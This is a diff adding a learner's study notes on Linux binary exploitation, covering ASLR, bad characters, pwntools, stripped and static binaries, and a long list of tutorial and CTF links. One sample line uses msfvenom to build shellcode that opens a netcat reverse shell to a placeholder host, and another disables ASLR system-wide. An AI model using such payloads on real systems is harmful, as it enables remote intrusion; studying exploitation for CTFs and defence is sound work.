@@ -1,0 +1,81 @@
+Notes:
+
+- GDB automaticlly turns off ASLR
+	- We can re-enable it if need be
+	
+- To configure ASLR system wide: 
+	- Update: /proc/sys/kernel/randomize_va_space
+	- With one of the below values:
+		0 – No randomization. Everything is static.
+		1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
+		2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.
+	- Example: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+	
+- On Linux 32bit and 64bit ELFs are exploited differently
+	- 32bit the EIP can be overwritten directly
+	- 64bit the RIP can not be. It has to be handled by a ret or another method. 
+	
+- Finding Bad Chars is super important. 
+	- Sometimes even after you think you found them all you will run into an issue because of it. 
+	- Always check out your memory to ensure things are being pushed in correctly. 
+	
+- PwnTools is a great set of tools:
+	- Adds on to GDB
+	- Helps automate alot of buffer overflow attacks, fuzzing, etc. 
+	- Unhex and hex commands as well as payload generation 
+
+- Generating Shellcode can be hit or miss
+	- Lots of testing is required.
+	- Sample commands:
+		- # sudo msfvenom -p linux/x64/exec CMD="nc -c /bin/sh <ip> 4444" --format python  -v SC --bad-chars "\x0a"
+
+- Depending on how you are sending the payload it is super important to send it as bytes vs a string or other. 
+	- See which works for each case. 
+	
+- Mind the little or big endian of the program
+		- Will mess with you when reading or writing shellcode or memory locations directly
+
+- IDA Free is a nice debugger but limited. 
+- Ghidra is nice to look at the code but no debugger. 
+- Immunity debugger is Windows only. 
+
+- ELFs can be dynamiclly linked or static linked. 
+	- This means it dynamiclly calls libc on the system it is running. Allowing us to see where those calls are occuring and what the call is. 
+	- Static means everything is in the ELF. No outside reference are present. 
+		- Static means you can't overwrite stuff in the GOT and maliciously redirect control flow
+	- With Ghidra we can add some of this info back in my tossing all of the locations of libc items at the binary. If they match then we know what the function is. 
+		- FIDOs are an example of this: https://github.com/openpreserve/fido
+
+- When source code is compiled it can be stripped
+	- This means no debugging information when reverse engineering.
+	- This means you will not even know where main() is. Makes looking for the overflow harder. 
+
+- Tools:
+	- https://github.com/pwndbg/pwndbg
+	- https://docs.pwntools.com/en/stable/install.html
+
+Helpful Links:
+- https://medium.com/@jain.sm/shell-code-exploit-with-buffer-overflow-8d78cc11f89b
+- https://medium.com/codex/buffer-overflows-shellcode-and-memory-corruption-51f546ab00ab
+- https://medium.com/@two06/solving-a-simple-buffer-overflow-with-pwntools-575a37e4ddb1
+- https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94 (INCREDIABLE VIDEOS, HELPED SOOO MUCH)
+	- Github link for videos: https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101
+- https://0xrick.github.io/binary-exploitation/bof5/
+- https://www.adamcouch.co.uk/python-generate-hex-characters/ (Generate all hex for bad char testing)
+- https://stackoverflow.com/questions/209513/convert-hex-string-to-integer-in-python
+- https://jlajara.gitlab.io/Privesc_Ret2libc_ASLR_64
+- https://samsclass.info/127/proj/ED4.htm
+- https://resources.infosecinstitute.com/topics/secure-coding/how-to-exploit-format-string-vulnerabilities/
+- https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920
+- https://ir0nstone.gitbook.io/notes/types/stack/format-string
+- https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf
+- https://axcheron.github.io/exploit-101-format-strings/ (SUPER GREAT, FORMAT STRINGS INFO)
+- https://vickieli.dev/binary%20exploitation/format-string-vulnerabilities/ (ANOTHER GREAT LINK ON FORMAT STRINGS)
+- https://ctftime.org/writeup/30724
+- https://stackoverflow.com/questions/16401993/return-to-libc-with-null-byte-in-the-addr
+- https://courses.cs.washington.edu/courses/cse484/19sp/files/cse484-section2-sp19.pdf
+- https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow
+- https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86 (MSF VENOM SHELLCODE GENERATION)
+- https://corruptedprotocol.medium.com/elf-x64-stack-buffer-overflow-advanced-app-system-introduction-to-rop-x64-6bb39a1c4887 (ROP OVERFLOW ATTACK)
+- https://medium.com/@buff3r/basic-buffer-overflow-on-64-bit-architecture-3fb74bab3558
+- https://jaybailey216.com/pwn-challenge-bat-computer/
